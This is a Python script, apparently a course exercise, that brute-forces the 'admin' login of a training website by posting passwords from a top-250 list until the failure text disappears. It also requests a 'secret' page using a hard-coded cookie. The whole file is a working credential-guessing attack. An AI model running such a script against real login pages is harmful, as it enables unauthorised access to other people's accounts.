import time
import requests


URL = "http://webisfun.cyber.org.il/login/login.php"
USER = "admin"
PASSWORD_FILE = "top250.txt"
LOGIN_FAILED_HTML = "invalid"

# Bonus
SECRET_URL = "http://webisfun.cyber.org.il/login/secret.php"
SECRET_COOKIE = {"magshim_manager": "python_is_better_than_c"}


def get_password_list(path):
    """
    This function reads password file and puts all passwords in a list
    :param path: path to text file
    :type path: str
    :return: password list
    :rtype: list
    """
    with open(path, "r") as top_pass:
        return top_pass.read().split("|")


def login(user, password):
    """
    Makes a single login using HTTP POST, with user and pass given as POST parameters
    :param user: username to use for login
    :type user: str
    :param pass: pass to use for login
    :type pass: str
    :return: http response text
    :rtype: str
    """
    postdata = {"username": user, "password": password}
    resp = requests.post(URL, data=postdata)
    return resp.text


## Bonus ##
def get_secret_page():
    """
    Makes a get request with secret cookie
    :return: http response text
    :rtype: str
    """
    resp = requests.get(SECRET_URL, cookies=SECRET_COOKIE)
    print(resp.text)
## /Bonus ##


def main():
    """
    Main function.
    """
    print(get_secret_page())
    passwords = get_password_list(PASSWORD_FILE)
    for passw in passwords:
        print("\ntrying user=" + USER + ", pass=" + passw)
        response = login(USER, passw)
        if response.find(LOGIN_FAILED_HTML) > -1:
            print("login is invalid")
        else:
            print("LOGIN SUCCESSFUL!!!")
            break
        time.sleep(1)


if __name__ == "__main__":
    main()
